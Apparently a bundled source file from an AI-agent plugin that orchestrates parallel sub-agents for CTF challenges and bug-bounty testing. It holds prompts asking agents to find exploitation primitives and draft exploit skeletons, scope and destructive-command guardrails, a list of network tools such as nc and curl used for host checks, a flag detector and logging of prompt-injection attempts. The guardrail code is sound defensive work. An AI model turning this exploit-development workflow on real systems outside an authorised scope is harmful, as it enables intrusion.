      `[Parallel HYPOTHESIS track ${i + 1}]`,
      ``,
      `Hypothesis: ${h.hypothesis}`,
      ``,
      `Execute the cheapest disconfirm test:`,
      h.disconfirmTest,
      ``,
      `Rules:`,
      `- Do exactly 1 test.`,
      `- Record observation.`,
      `- State whether hypothesis is SUPPORTED, REFUTED, or INCONCLUSIVE.`,
      `- Do NOT proceed beyond this single test.`
    ].join(`
`)
  }));
  return { tracks, label: "hypothesis-test" };
}
function planDeepWorkerDispatch(state, config2, goal) {
  const target = state.targetType;
  const trimmedGoal = goal.trim();
  const basePrompt = trimmedGoal ? `[Parallel DEEP-WORK track]

Goal:
${trimmedGoal.slice(0, 2000)}

` : `[Parallel DEEP-WORK track]

`;
  if (state.mode === "BOUNTY" && !state.scopeConfirmed) {
    return {
      label: "deep-scope",
      tracks: [
        {
          purpose: "scope-first",
          agent: "bounty-scope",
          prompt: `${basePrompt}Scope is not confirmed. Do scope-first triage only and stop.`
        }
      ]
    };
  }
  if (state.mode === "BOUNTY") {
    return {
      label: `deep-bounty-${target.toLowerCase()}`,
      tracks: [
        {
          purpose: "bounty-triage",
          agent: "bounty-triage",
          prompt: `${basePrompt}Do scope-safe triage. Prefer read-only evidence and minimal-impact validation steps. Return 2-3 concrete hypotheses and ONE next TODO.`
        },
        {
          purpose: "bounty-research",
          agent: "bounty-research",
          prompt: `${basePrompt}Do scope-safe vulnerability research (CVE/config/misuse patterns). Return 2-3 hypotheses + cheapest minimal-impact validations.`
        },
        {
          purpose: "budget-compact",
          agent: "md-scribe",
          prompt: `${basePrompt}If notes are noisy/long, compact durable notes and return a concise CONTEXT_PACK style summary for safe continuation.`
        }
      ]
    };
  }
  if (target !== "PWN" && target !== "REV") {
    const plan = planScanDispatch(state, config2, trimmedGoal);
    return { ...plan, label: `deep-${target.toLowerCase()}` };
  }
  const tracks = target === "PWN" ? [
    {
      purpose: "pwn-primitive",
      agent: "ctf-pwn",
      prompt: `${basePrompt}Find the vulnerability class + exploitation primitive. Provide deterministic repro steps and the cheapest next test.`
    },
    {
      purpose: "exploit-skeleton",
      agent: "ctf-solve",
      prompt: `${basePrompt}Draft an exploit skeleton and a minimal validation loop (local first). Focus on reliability and evidence.`
    },
    {
      purpose: "env-parity",
      agent: "ctf-explore",
      prompt: `${basePrompt}Check environment parity assumptions (arch, protections, libc/loader, remote constraints). List cheapest confirmations.`
    },
    {
      purpose: "research-technique",
      agent: "ctf-research",
      prompt: `${basePrompt}Search for similar PWN patterns and likely exploitation techniques. Return top 3 hypotheses + cheapest disconfirm tests.`
    }
  ] : [
    {
      purpose: "rev-static",
      agent: "ctf-rev",
      prompt: `${basePrompt}Do static analysis: locate key logic, inputs, checks, and candidate constraints. Return top observations and likely pivot points.`
    },
    {
      purpose: "rev-dynamic",
      agent: "ctf-explore",
      prompt: `${basePrompt}Do dynamic/runtime-grounded probing (run traces, observe behavior, inputs/outputs). Return concrete evidence artifacts to collect.`
    },
    {
      purpose: "rev-instrument",
      agent: "ctf-rev",
      prompt: `${basePrompt}Propose the cheapest instrumentation/patch to dump runtime-expected values (avoid full solve). Provide exact next TODO.`
    },
    {
      purpose: "research-obfuscation",
      agent: "ctf-research",
      prompt: `${basePrompt}Research similar REV patterns (VM/packer/anti-debug) and list 2-3 likely techniques + cheapest validations.`
    }
  ];
  return { tracks, label: `deep-${target.toLowerCase()}` };
}
function hasError(result) {
  if (!result || typeof result !== "object")
    return false;
  const r = result;
  return Boolean(r.error);
}
async function callSessionCreateId(sessionClient, directory, parentID, title) {
  try {
    const primary = await sessionClient.create({
      query: { directory },
      body: { parentID, title }
    });
    const id = primary?.data?.id;
    if (typeof id === "string" && id && !hasError(primary))
      return id;
  } catch {}
  try {
    const fallback = await sessionClient.create({ directory, parentID, title });
    const id = fallback?.data?.id;
    if (typeof id === "string" && id && !hasError(fallback))
      return id;
  } catch {}
  return null;
}
async function callSessionPromptAsync(sessionClient, sessionID, directory, agent, prompt, system) {
  const body = {
    agent,
    system,
    tools: {
      task: false,
      background_task: false
    },
    parts: [{ type: "text", text: prompt }]
  };
  try {
    const primary = await sessionClient.promptAsync({
      path: { id: sessionID },
      query: { directory },
      body
    });
    if (!hasError(primary))
      return true;
  } catch {}
  try {
    const fallback = await sessionClient.promptAsync({
      sessionID,
      directory,
      agent,
      system,
      tools: body.tools,
      parts: body.parts
    });
    return !hasError(fallback);
  } catch {
    return false;
  }
}
async function callSessionMessagesData(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (Array.isArray(primary?.data) && !hasError(primary))
      return primary.data;
  } catch {}
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (Array.isArray(fallback?.data) && !hasError(fallback))
      return fallback.data;
  } catch {}
  return null;
}
async function callSessionAbort(sessionClient, sessionID, directory) {
  try {
    const primary = await sessionClient.abort({ path: { id: sessionID }, query: { directory } });
    if (!hasError(primary))
      return true;
  } catch {}
  try {
    const fallback = await sessionClient.abort({ sessionID, directory });
    return !hasError(fallback);
  } catch {
    return false;
  }
}
function extractSessionClient(client) {
  if (!client || typeof client !== "object")
    return null;
  const c = client;
  const session = c.session;
  if (!session || typeof session !== "object")
    return null;
  const s = session;
  const hasCreate = typeof s.create === "function";
  const hasPromptAsync = typeof s.promptAsync === "function";
  const hasMessages = typeof s.messages === "function";
  const hasAbort = typeof s.abort === "function";
  const hasStatus = typeof s.status === "function";
  const hasChildren = typeof s.children === "function";
  if (!hasCreate || !hasPromptAsync || !hasMessages || !hasAbort) {
    return null;
  }
  return {
    create: s.create,
    promptAsync: s.promptAsync,
    messages: s.messages,
    abort: s.abort,
    status: hasStatus ? s.status : async () => ({ data: {} }),
    children: hasChildren ? s.children : async () => ({ data: undefined })
  };
}
async function dispatchParallel(sessionClient, parentSessionID, directory, plan, maxTracks, options) {
  const parallelConfig = options?.parallel;
  const capDefault = parallelConfig?.max_concurrent_per_provider ?? 2;
  const providerCaps = parallelConfig?.provider_caps ?? {};
  const queueEnabled = parallelConfig?.queue_enabled ?? true;
  const group = {
    parentSessionID,
    label: plan.label,
    tracks: [],
    queue: [],
    parallel: {
      capDefault,
      providerCaps,
      queueEnabled
    },
    createdAt: Date.now(),
    completedAt: 0,
    winnerSessionID: "",
    maxTracks
  };
  const tracksToDispatch = plan.tracks.slice(0, maxTracks);
  const activeByProvider = {};
  for (const trackPlan of tracksToDispatch) {
    const provider = providerForAgent(trackPlan.agent);
    const cap = providerCaps[provider] ?? capDefault;
    if (queueEnabled && cap > 0 && (activeByProvider[provider] ?? 0) >= cap) {
      group.queue.push(trackPlan);
      continue;
    }
    const track = {
      sessionID: "",
      purpose: trackPlan.purpose,
      agent: trackPlan.agent,
      provider,
      prompt: trackPlan.prompt,
      status: "pending",
      createdAt: Date.now(),
      completedAt: 0,
      result: "",
      isWinner: false
    };
    try {
      const title = `[Aegis Parallel] ${plan.label} / ${trackPlan.purpose}`;
      const sessionID = await callSessionCreateId(sessionClient, directory, parentSessionID, title);
      if (!sessionID) {
        track.status = "failed";
        track.result = "Failed to create child session (no ID returned)";
        group.tracks.push(track);
        continue;
      }
      track.sessionID = sessionID;
      track.status = "running";
      const prompted = await callSessionPromptAsync(sessionClient, sessionID, directory, trackPlan.agent, trackPlan.prompt, options?.systemPrompt);
      if (!prompted) {
        track.status = "failed";
        track.result = "Failed to prompt child session (promptAsync error)";
      }
      group.tracks.push(track);
      activeByProvider[provider] = (activeByProvider[provider] ?? 0) + 1;
    } catch (error48) {
      track.status = "failed";
      track.result = `Dispatch error: ${error48 instanceof Error ? error48.message : String(error48)}`;
      group.tracks.push(track);
    }
  }
  const existing = groupsByParent.get(parentSessionID) ?? [];
  existing.push(group);
  groupsByParent.set(parentSessionID, existing);
  persistParallelGroups();
  return group;
}
async function dispatchQueuedTracks(sessionClient, group, directory, systemPrompt) {
  if (!group.parallel.queueEnabled)
    return 0;
  if (group.queue.length === 0)
    return 0;
  const activeByProvider = {};
  for (const t of group.tracks) {
    if (t.status !== "running" && t.status !== "pending")
      continue;
    activeByProvider[t.provider] = (activeByProvider[t.provider] ?? 0) + 1;
  }
  const capDefault = group.parallel.capDefault;
  const providerCaps = group.parallel.providerCaps;
  const capFor = (provider) => providerCaps[provider] ?? capDefault;
  let dispatched = 0;
  let progressed = true;
  while (progressed && group.queue.length > 0) {
    progressed = false;
    for (let i = 0;i < group.queue.length; i += 1) {
      const trackPlan = group.queue[i];
      const provider = providerForAgent(trackPlan.agent);
      const cap = capFor(provider);
      if (cap > 0 && (activeByProvider[provider] ?? 0) >= cap) {
        continue;
      }
      group.queue.splice(i, 1);
      const track = {
        sessionID: "",
        purpose: trackPlan.purpose,
        agent: trackPlan.agent,
        provider,
        prompt: trackPlan.prompt,
        status: "pending",
        createdAt: Date.now(),
        completedAt: 0,
        result: "",
        isWinner: false
      };
      try {
        const title = `[Aegis Parallel] ${group.label} / ${trackPlan.purpose}`;
        const sessionID = await callSessionCreateId(sessionClient, directory, group.parentSessionID, title);
        if (!sessionID) {
          track.status = "failed";
          track.result = "Failed to create child session (no ID returned)";
          group.tracks.push(track);
          progressed = true;
          dispatched += 1;
          break;
        }
        track.sessionID = sessionID;
        track.status = "running";
        const prompted = await callSessionPromptAsync(sessionClient, sessionID, directory, trackPlan.agent, trackPlan.prompt, systemPrompt);
        if (!prompted) {
          track.status = "failed";
          track.result = "Failed to prompt child session (promptAsync error)";
        }
        group.tracks.push(track);
        activeByProvider[provider] = (activeByProvider[provider] ?? 0) + 1;
        progressed = true;
        dispatched += 1;
        break;
      } catch (error48) {
        track.status = "failed";
        track.result = `Dispatch error: ${error48 instanceof Error ? error48.message : String(error48)}`;
        group.tracks.push(track);
        progressed = true;
        dispatched += 1;
        break;
      }
    }
  }
  if (dispatched > 0) {
    persistParallelGroups();
  }
  return dispatched;
}
async function collectResults(sessionClient, group, directory, messageLimit = 5, options) {
  const results = [];
  const idleSessionIDs = options?.idleSessionIDs;
  for (const track of group.tracks) {
    if (!track.sessionID || track.status === "failed" || track.status === "aborted") {
      results.push({
        sessionID: track.sessionID,
        purpose: track.purpose,
        agent: track.agent,
        status: track.status,
        messages: [],
        lastAssistantMessage: track.result || "(no result)"
      });
      continue;
    }
    try {
      const data = await callSessionMessagesData(sessionClient, track.sessionID, directory, messageLimit);
      const msgs = [];
      let lastAssistant = "";
      if (Array.isArray(data)) {
        for (const msg of data) {
          if (!msg || typeof msg !== "object")
            continue;
          const m = msg;
          const role = typeof m.role === "string" ? m.role : m.info && typeof m.info === "object" && typeof m.info.role === "string" ? String(m.info.role) : "";
          const parts = Array.isArray(m.parts) ? m.parts : [];
          const text = parts.map((p) => {
            if (!p || typeof p !== "object")
              return "";
            const part = p;
            return typeof part.text === "string" ? part.text : "";
          }).filter(Boolean).join(`
`);
          if (text) {
            msgs.push(`[${role}] ${text.slice(0, 1000)}`);
            if (role === "assistant") {
              lastAssistant = text;
            }
          }
        }
      }
      if (lastAssistant) {
        track.result = lastAssistant.slice(0, 2000);
        track.status = "completed";
        track.completedAt = Date.now();
      } else if (idleSessionIDs && idleSessionIDs.has(track.sessionID)) {
        track.result = track.result || "(idle; no assistant text message found)";
        track.status = "completed";
        track.completedAt = Date.now();
      }
      results.push({
        sessionID: track.sessionID,
        purpose: track.purpose,
        agent: track.agent,
        status: track.status,
        messages: msgs,
        lastAssistantMessage: lastAssistant.slice(0, 2000)
      });
    } catch (error48) {
      results.push({
        sessionID: track.sessionID,
        purpose: track.purpose,
        agent: track.agent,
        status: "failed",
        messages: [],
        lastAssistantMessage: `Collection error: ${error48 instanceof Error ? error48.message : String(error48)}`
      });
    }
  }
  const allTracksDone = group.tracks.every((t) => t.status === "completed" || t.status === "failed" || t.status === "aborted");
  const allDone = allTracksDone && group.queue.length === 0;
  if (allDone && group.completedAt === 0) {
    group.completedAt = Date.now();
  }
  persistParallelGroups();
  return results;
}
async function abortTrack(sessionClient, group, sessionID, directory) {
  const track = group.tracks.find((t) => t.sessionID === sessionID);
  if (!track)
    return false;
  if (track.status === "aborted" || track.status === "completed" || track.status === "failed") {
    return false;
  }
  try {
    const ok = await callSessionAbort(sessionClient, sessionID, directory);
    if (!ok) {
      return false;
    }
    track.status = "aborted";
    track.completedAt = Date.now();
    persistParallelGroups();
    return true;
  } catch {
    return false;
  }
}
async function abortAllExcept(sessionClient, group, winnerSessionID, directory) {
  let aborted2 = 0;
  if (group.queue.length > 0) {
    aborted2 += group.queue.length;
    group.queue = [];
  }
  for (const track of group.tracks) {
    if (track.sessionID === winnerSessionID) {
      track.isWinner = true;
      continue;
    }
    if (track.status !== "running" && track.status !== "pending")
      continue;
    const ok = await abortTrack(sessionClient, group, track.sessionID, directory);
    if (ok)
      aborted2 += 1;
  }
  group.winnerSessionID = winnerSessionID;
  group.completedAt = Date.now();
  persistParallelGroups();
  return aborted2;
}
async function abortAll(sessionClient, group, directory) {
  let aborted2 = 0;
  if (group.queue.length > 0) {
    aborted2 += group.queue.length;
    group.queue = [];
  }
  for (const track of group.tracks) {
    if (track.status !== "running" && track.status !== "pending")
      continue;
    const ok = await abortTrack(sessionClient, group, track.sessionID, directory);
    if (ok)
      aborted2 += 1;
  }
  group.completedAt = Date.now();
  persistParallelGroups();
  return aborted2;
}
function groupSummary(group) {
  return {
    label: group.label,
    parentSessionID: group.parentSessionID,
    createdAt: new Date(group.createdAt).toISOString(),
    completedAt: group.completedAt > 0 ? new Date(group.completedAt).toISOString() : null,
    winnerSessionID: group.winnerSessionID || null,
    maxTracks: group.maxTracks,
    queued: group.queue.length,
    tracks: group.tracks.map((t) => ({
      sessionID: t.sessionID,
      purpose: t.purpose,
      agent: t.agent,
      status: t.status,
      isWinner: t.isWinner,
      resultPreview: t.result ? t.result.slice(0, 200) : null
    }))
  };
}

// src/risk/policy-matrix.ts
function evaluateBashCommand(command, config2, mode, options) {
  const containsNewline = /[\r\n]/.test(command);
  const sanitized = sanitizeCommand(command);
  const deny = (denyLevel, reason) => {
    return {
      allow: false,
      reason,
      sanitizedCommand: sanitized,
      denyLevel
    };
  };
  const denyHard = (reason) => deny("hard", reason);
  const denySoft = (reason) => deny("soft", reason);
  const readonlySegmentsBlockedReason = (reason) => {
    return denyHard(reason);
  };
  const splitReadonlySegments = (input) => {
    return input.split(/\s*(?:\|\||&&|;|\|)\s*/).map((part) => part.trim()).filter((part) => part.length > 0);
  };
  const hasForbiddenReadonlyShellSyntax = (segment) => {
    if (/[<>]/.test(segment))
      return true;
    if (segment.includes("`"))
      return true;
    if (segment.includes("$("))
      return true;
    if (/\b(sudo|doas)\b/i.test(segment))
      return true;
    if (/^find(\s|$)/i.test(segment)) {
      if (/(\s|^)-(delete|execdir|exec|okdir|ok)(\s|$)/i.test(segment))
        return true;
    }
    return false;
  };
  if (mode === "BOUNTY" && options?.scopeConfirmed !== true) {
    if (containsNewline) {
      return readonlySegmentsBlockedReason("BOUNTY guardrail blocked multi-line command before scope confirmation.");
    }
    const segments = splitReadonlySegments(sanitized);
    if (segments.length === 0) {
      return readonlySegmentsBlockedReason("BOUNTY guardrail blocked empty command before scope confirmation.");
    }
    for (const segment of segments) {
      if (hasForbiddenReadonlyShellSyntax(segment)) {
        return readonlySegmentsBlockedReason("BOUNTY guardrail blocked unsafe shell syntax before scope confirmation.");
      }
      const segmentAllowed = config2.guardrails.bounty_scope_readonly_patterns.some((pattern) => {
        try {
          return new RegExp(pattern, "i").test(segment);
        } catch {
          return false;
        }
      });
      if (!segmentAllowed) {
        return readonlySegmentsBlockedReason("BOUNTY guardrail blocked non-read-only command before scope confirmation.");
      }
    }
  }
  if (mode === "BOUNTY") {
    if (config2.bounty_policy.deny_scanner_commands) {
      for (const pattern of config2.bounty_policy.scanner_command_patterns) {
        let expression;
        try {
          expression = new RegExp(pattern, "i");
        } catch {
          continue;
        }
        if (expression.test(sanitized)) {
          return denySoft(`BOUNTY guardrail blocked scanner/automation pattern: ${pattern}`);
        }
      }
    }
    const scopePolicy = options?.scopePolicy ?? null;
    const now = options?.now ?? new Date;
    const enforceBlackout = config2.bounty_policy.enforce_blackout_windows;
    const enforceAllowedHosts = config2.bounty_policy.enforce_allowed_hosts;
    const urlHosts = extractUrlHosts(sanitized);
    const networkHosts = extractNetworkHosts(sanitized);
    const hostsToCheck = [...new Set([...urlHosts, ...networkHosts])];
    if (enforceBlackout && scopePolicy && scopePolicy.blackoutWindows.length > 0) {
      if (hostsToCheck.length > 0 && isInBlackout(now, scopePolicy.blackoutWindows)) {
        return denySoft("BOUNTY guardrail blocked network command during blackout window.");
      }
    }
    if (options?.scopeConfirmed === true && enforceAllowedHosts && scopePolicy && hostsToCheck.length > 0) {
      for (const host of hostsToCheck) {
        const verdict = hostMatchesPolicy(host, scopePolicy);
        if (!verdict.allowed) {
          return denySoft(`BOUNTY guardrail blocked out-of-scope host '${host}' (${verdict.reason ?? "policy"}).`);
        }
      }
    }
  }
  if (!config2.guardrails.deny_destructive_bash) {
    return { allow: true, sanitizedCommand: sanitized };
  }
  for (const pattern of config2.guardrails.destructive_command_patterns) {
    let expression;
    try {
      expression = new RegExp(pattern, "i");
    } catch {
      continue;
    }
    if (expression.test(sanitized)) {
      return denyHard(`${mode} guardrail blocked destructive command pattern: ${pattern}`);
    }
  }
  return {
    allow: true,
    sanitizedCommand: sanitized
  };
}
function extractUrlHosts(command) {
  const hosts = [];
  const re = /https?:\/\/[^\s"']+/gi;
  const matches = command.match(re) ?? [];
  for (const raw of matches) {
    try {
      const u = new URL(raw);
      if (u.hostname) {
        hosts.push(u.hostname);
      }
    } catch {
      continue;
    }
  }
  return hosts;
}
function isIPv4(value) {
  const parts = value.split(".");
  if (parts.length !== 4)
    return false;
  for (const part of parts) {
    if (!/^\d{1,3}$/.test(part))
      return false;
    const n = Number(part);
    if (!Number.isFinite(n) || n < 0 || n > 255)
      return false;
  }
  return true;
}
function isIPv6(value) {
  if (!value.includes(":"))
    return false;
  return /^[0-9a-f:]+$/i.test(value);
}
function normalizeHostToken(rawToken) {
  const trimmed = rawToken.replace(/^[`'"\(\{<]+|[`'"\)\}>.,;:]+$/g, "");
  if (!trimmed)
    return "";
  if (trimmed.startsWith("[") && trimmed.includes("]")) {
    const close = trimmed.indexOf("]");
    const inside = trimmed.slice(1, close);
    return inside;
  }
  let token = trimmed.replace(/^\[+|\]+$/g, "");
  const at = token.lastIndexOf("@");
  if (at >= 0 && at < token.length - 1) {
    token = token.slice(at + 1);
  }
  if (token.includes(":") && token.indexOf(":") === token.lastIndexOf(":")) {
    const maybePort = token.slice(token.lastIndexOf(":") + 1);
    if (/^\d{1,5}$/.test(maybePort)) {
      token = token.slice(0, token.lastIndexOf(":"));
    }
  }
  return token.toLowerCase();
}
function extractNetworkHosts(command) {
  const trimmed = command.trim();
  if (!trimmed)
    return [];
  const tokens = trimmed.split(/\s+/);
  if (tokens.length < 2)
    return [];
  const tool = tokens[0].toLowerCase();
  const networkTools = new Set([
    "curl",
    "wget",
    "http",
    "https",
    "ping",
    "dig",
    "nslookup",
    "traceroute",
    "nc",
    "netcat",
    "telnet",
    "ssh"
  ]);
  if (!networkTools.has(tool))
    return [];
  const hosts = new Set;
  for (let i = 1;i < tokens.length; i += 1) {
    const t = tokens[i];
    if (!t)
      continue;
    if (t.startsWith("-"))
      continue;
    const candidates = t.split(",").map((item) => item.trim()).filter(Boolean);
    for (const candidate of candidates) {
      if (/^https?:\/\//i.test(candidate)) {
        try {
          const host2 = new URL(candidate).hostname;
          if (host2) {
            hosts.add(host2.toLowerCase());
          }
        } catch {
          continue;
        }
        continue;
      }
      const host = normalizeHostToken(candidate);
      if (!host)
        continue;
      if (/^[a-z0-9-]+(\.[a-z0-9-]+)+$/i.test(host) || isIPv4(host) || isIPv6(host)) {
        hosts.add(host);
      }
    }
  }
  return [...hosts];
}
function extractBashCommand(metadata) {
  if (!metadata || typeof metadata !== "object") {
    return "";
  }
  const data = metadata;
  const keys = ["command", "cmd", "input", "arguments"];
  for (const key of keys) {
    const value = data[key];
    if (typeof value === "string" && value.trim().length > 0) {
      return value;
    }
  }
  return "";
}

// src/orchestration/flag-detector.ts
var DEFAULT_FLAG_PATTERNS = [
  /flag\{[^}]{1,200}\}/gi,
  /CTF\{[^}]{1,200}\}/gi,
  /picoCTF\{[^}]{1,200}\}/gi,
  /htb\{[^}]{1,200}\}/gi,
  /TCTF\{[^}]{1,200}\}/gi,
  /SECCON\{[^}]{1,200}\}/gi,
  /ASIS\{[^}]{1,200}\}/gi,
  /CCTF\{[^}]{1,200}\}/gi,
  /hxp\{[^}]{1,200}\}/gi,
  /PCTF\{[^}]{1,200}\}/gi,
  /dice\{[^}]{1,200}\}/gi,
  /uiuctf\{[^}]{1,200}\}/gi,
  /ictf\{[^}]{1,200}\}/gi,
  /actf\{[^}]{1,200}\}/gi,
  /zer0pts\{[^}]{1,200}\}/gi
];
var candidates = [];
var customPattern = null;
var FAKE_PLACEHOLDER_RE2 = /(?:fake|placeholder|example|sample|dummy|mock|test[_-]?flag|not[_-]?real|decoy)/i;
function cloneAsGlobalRegex(pattern) {
  const flags = pattern.flags.includes("g") ? pattern.flags : `${pattern.flags}g`;
  return new RegExp(pattern.source, flags);
}
function confidenceForFlag(flag) {
  const trimmed = flag.trim();
  if (!trimmed || trimmed.length < 6 || trimmed.length > 220) {
    return "low";
  }
  const openBrace = trimmed.indexOf("{");
  const payload = openBrace >= 0 && trimmed.endsWith("}") ? trimmed.slice(openBrace + 1, -1) : trimmed;
  if (FAKE_PLACEHOLDER_RE2.test(payload)) {
    return "low";
  }
  const hasWhitespace = /\s/.test(trimmed);
  const hasBalancedBraces = trimmed.includes("{") && trimmed.endsWith("}");
  if (hasBalancedBraces && !hasWhitespace) {
    return "high";
  }
  if (hasBalancedBraces) {
    return "medium";
  }
  return "low";
}
function inferFormat(flag) {
  const openBrace = flag.indexOf("{");
  if (openBrace <= 0) {
    return "unknown";
  }
  return `${flag.slice(0, openBrace)}{...}`;
}
function dedupe(items) {
  const seen = new Set;
  const output = [];
  for (const item of items) {
    const key = `${item.flag}|${item.source}`;
    if (seen.has(key)) {
      continue;
    }
    seen.add(key);
    output.push(item);
  }
  return output;
}
function setCustomFlagPattern(pattern) {
  const normalized = pattern.trim();
  if (!normalized) {
    customPattern = null;
    return;
  }
  try {
    customPattern = new RegExp(normalized, "gi");
  } catch {
    throw new Error(`Invalid custom flag pattern: ${pattern}`);
  }
}
function scanForFlags(text, source) {
  const safeText = text ?? "";
  if (!safeText) {
    return [];
  }
  const safeSource = source.trim() || "unknown";
  const now = Date.now();
  const patterns = customPattern ? [customPattern, ...DEFAULT_FLAG_PATTERNS] : DEFAULT_FLAG_PATTERNS;
  const found = [];
  for (const pattern of patterns) {
    const globalRegex = cloneAsGlobalRegex(pattern);
    const matches = safeText.matchAll(globalRegex);
    for (const match of matches) {
      const raw = match[0]?.trim() ?? "";
      if (!raw) {
        continue;
      }
      found.push({
        flag: raw,
        format: inferFormat(raw),
        source: safeSource,
        confidence: confidenceForFlag(raw),
        timestamp: now
      });
    }
  }
  const uniqueFound = dedupe(found);
  if (uniqueFound.length === 0) {
    return [];
  }
  const existingKeys = new Set(candidates.map((c) => `${c.flag}|${c.source}`));
  for (const candidate of uniqueFound) {
    const key = `${candidate.flag}|${candidate.source}`;
    if (existingKeys.has(key)) {
      continue;
    }
    candidates.push(candidate);
    existingKeys.add(key);
  }
  return uniqueFound;
}
function getCandidates() {
  return [...candidates].sort((a, b) => b.timestamp - a.timestamp);
}
function buildFlagAlert(flagCandidates) {
  if (!flagCandidates || flagCandidates.length === 0) {
    return "";
  }
  const lines = [
    `Potential flags detected (${flagCandidates.length}):`,
    "Treat these as CANDIDATES until official verifier confirms Correct/Accepted."
  ];
  for (const candidate of flagCandidates) {
    lines.push(`- ${candidate.flag} | format=${candidate.format} | confidence=${candidate.confidence} | source=${candidate.source}`);
  }
  return lines.join(`
`);
}
function containsFlag(text) {
  const safeText = text ?? "";
  if (!safeText) {
    return false;
  }
  const patterns = customPattern ? [customPattern, ...DEFAULT_FLAG_PATTERNS] : DEFAULT_FLAG_PATTERNS;
  return patterns.some((pattern) => cloneAsGlobalRegex(pattern).test(safeText));
}

// src/state/notes-store.ts
import {
  accessSync,
  appendFileSync,
  constants,
  existsSync as existsSync5,
  mkdirSync as mkdirSync2,
  readFileSync as readFileSync5,
  renameSync as renameSync2,
  writeFileSync as writeFileSync2
} from "fs";
import { join as join6 } from "path";

class NotesStore {
  rootDir;
  archiveDir;
  budgets;
  constructor(baseDirectory, markdownBudget, rootDirName = ".Aegis") {
    this.rootDir = join6(baseDirectory, rootDirName);
    this.archiveDir = join6(this.rootDir, "archive");
    this.budgets = {
      WORKLOG: { lines: markdownBudget.worklog_lines, bytes: markdownBudget.worklog_bytes },
      EVIDENCE: { lines: markdownBudget.evidence_lines, bytes: markdownBudget.evidence_bytes },
      SCAN: { lines: markdownBudget.scan_lines, bytes: markdownBudget.scan_bytes },
      CONTEXT_PACK: {
        lines: markdownBudget.context_pack_lines,
        bytes: markdownBudget.context_pack_bytes
      }
    };
  }
  getRootDirectory() {
    return this.rootDir;
  }
  checkWritable() {
    const issues = [];
    try {
      this.ensureFiles();
    } catch (error48) {
      const message = error48 instanceof Error ? error48.message : String(error48);
      issues.push(`failed to initialize notes directory '${this.rootDir}': ${message}`);
      return { ok: false, issues };
    }
    const targets = [
      this.rootDir,
      join6(this.rootDir, "STATE.md"),
      join6(this.rootDir, "WORKLOG.md"),
      join6(this.rootDir, "EVIDENCE.md"),
      join6(this.rootDir, "SCAN.md"),
      join6(this.rootDir, "CONTEXT_PACK.md")
    ];
    for (const target of targets) {
      try {
        accessSync(target, constants.W_OK);
      } catch (error48) {
        const message = error48 instanceof Error ? error48.message : String(error48);
        issues.push(`not writable: ${target} (${message})`);
      }
    }
    return { ok: issues.length === 0, issues };
  }
  ensureFiles() {
    mkdirSync2(this.rootDir, { recursive: true });
    mkdirSync2(this.archiveDir, { recursive: true });
    this.ensureFile("STATE.md", `# STATE
`);
    this.ensureFile("WORKLOG.md", `# WORKLOG
`);
    this.ensureFile("EVIDENCE.md", `# EVIDENCE
`);
    this.ensureFile("SCAN.md", `# SCAN
`);
    this.ensureFile("CONTEXT_PACK.md", `# CONTEXT_PACK
`);
  }
  recordChange(sessionID, state, reason, decision) {
    this.ensureFiles();
    this.writeState(sessionID, state, decision);
    this.writeContextPack(sessionID, state, decision);
    this.appendWorklog(sessionID, state, reason, decision);
    if (reason === "verify_success") {
      this.appendEvidence(sessionID, state);
    }
  }
  recordScan(summary) {
    this.appendWithBudget("SCAN.md", `
## ${this.now()}
- ${summary}
`, this.budgets.SCAN);
  }
  recordInjectionAttempt(source, indicators, snippet) {
    const compactSnippet = snippet.replace(/\s+/g, " ").trim().slice(0, 240);
    const summary = `INJECTION-ATTEMPT source=${source} indicators=${indicators.join(",")} snippet=${compactSnippet || "(empty)"}`;
    this.recordScan(summary);
  }
  checkBudgets() {
    this.ensureFiles();
    return [
      this.inspectFile("WORKLOG.md", this.budgets.WORKLOG),
      this.inspectFile("EVIDENCE.md", this.budgets.EVIDENCE),
      this.inspectFile("SCAN.md", this.budgets.SCAN),
      this.inspectFile("CONTEXT_PACK.md", this.budgets.CONTEXT_PACK)
    ].filter((issue2) => issue2 !== null);
  }
  compactNow() {
    this.ensureFiles();
    const actions = [];
    const files = [
      ["WORKLOG.md", this.budgets.WORKLOG],
      ["EVIDENCE.md", this.budgets.EVIDENCE],
      ["SCAN.md", this.budgets.SCAN],
      ["CONTEXT_PACK.md", this.budgets.CONTEXT_PACK]
    ];
    for (const [fileName, budget] of files) {
      const rotated = this.rotateIfNeeded(fileName, budget);
      if (rotated) {
        actions.push(`ROTATED ${fileName}`);
      }
    }
    if (actions.length === 0) {
      actions.push("No files exceeded markdown budget.");
    }
    return actions;
  }
  ensureFile(fileName, initial) {
    const path = join6(this.rootDir, fileName);
    if (!existsSync5(path)) {
      writeFileSync2(path, `${initial}
`, "utf-8");
    }
  }
  writeState(sessionID, state, decision) {
    const path = join6(this.rootDir, "STATE.md");
    const content = [
      "# STATE",
      `updated_at: ${this.now()}`,
      `session_id: ${sessionID}`,
      `mode: ${state.mode}`,
      `phase: ${state.phase}`,
      `target: ${state.targetType}`,
      `scope_confirmed: ${state.scopeConfirmed}`,
      `candidate_pending_verification: ${state.candidatePendingVerification}`,
      `latest_candidate: ${state.latestCandidate || "(none)"}`,
      `latest_verified: ${state.latestVerified || "(none)"}`,
      `hypothesis: ${state.hypothesis || "(none)"}`,
      `next_route: ${decision.primary}`,
      `next_reason: ${decision.reason}`,
      ""
    ].join(`
`);
    writeFileSync2(path, content, "utf-8");
  }
  writeContextPack(sessionID, state, decision) {
    const path = join6(this.rootDir, "CONTEXT_PACK.md");
    const content = [
      "# CONTEXT_PACK",
      `updated_at: ${this.now()}`,
      `session_id: ${sessionID}`,
      `mode=${state.mode}, phase=${state.phase}, target=${state.targetType}`,
      `scope_confirmed=${state.scopeConfirmed}, candidate_pending=${state.candidatePendingVerification}`,
      `verify_fail_count=${state.verifyFailCount}, no_new_evidence=${state.noNewEvidenceLoops}, same_payload=${state.samePayloadLoops}`,
      `context_fail=${state.contextFailCount}, timeout_fail=${state.timeoutFailCount}`,
      `latest_candidate=${state.latestCandidate || "(none)"}`,
      `latest_verified=${state.latestVerified || "(none)"}`,
      `hypothesis=${state.hypothesis || "(none)"}`,
      `next_route=${decision.primary}`,
      ""
    ].join(`
`);
    writeFileSync2(path, content, "utf-8");
    this.rotateIfNeeded("CONTEXT_PACK.md", this.budgets.CONTEXT_PACK);
  }
  appendWorklog(sessionID, state, reason, decision) {
    const block = [
      "",
      `## ${this.now()}`,
